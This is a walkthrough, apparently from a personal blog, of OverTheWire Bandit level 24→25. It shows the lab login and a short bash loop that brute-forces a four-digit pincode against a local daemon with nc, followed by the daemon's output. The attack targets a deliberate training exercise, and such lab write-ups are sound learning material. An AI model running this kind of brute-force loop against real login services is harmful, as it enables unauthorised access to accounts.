+++
title = "Bandit 24 → 25"
date = 2026-06-19
description = "walkthrough of the Bandit 24 → 25"
tags = ["bandit", "walkthrough", "linux", "otw"]
+++
[previous level](../../posts/bandit_23_24)
### Login
ssh: `ssh -p 2220 bandit24@bandit.labs.overthewire.org`
pass: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
***

### Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time
***

### Solution

To solve this level, we need to brute-force the pincode.

First, we need to find out what the daemon is doing:
```bash
bandit24@bandit:~$ cat /etc/bandit_pass/bandit24 | nc localhost 30002 0000
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

Now that we know the format expected by the daemon, we can write a simple script to brute-force the pincode:
```bash
#!/bin/bash
for i in {0000..9999}; do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" 
done| nc localhost 30002 
```

let the script till it runs out of pincodes:
```bash
bandit24@bandit:~$ /tmp/brute.sh
t current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
...
The password of user bandit25 is <password>
```

With this we have our password for bandit25.
***
[Next level](../../posts/bandit_25_26)
